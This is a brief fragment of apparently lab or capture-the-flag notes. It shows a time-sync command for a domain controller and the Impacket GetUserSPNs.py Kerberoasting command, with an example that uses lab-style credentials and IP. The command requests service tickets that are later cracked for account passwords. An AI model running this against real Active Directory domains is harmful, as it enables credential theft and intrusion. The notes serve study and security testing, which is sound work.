ntpd -g -q 
This will sync the time and the dc together


```bash
GetUserSPNs.py [DOMAIN]/USERNAME:PASSWORD -dc-ip [IP] -request
example: GetUserSPNs.py control.local/mrwelldone:password123 -dc-ip 10.10.10.10 -request
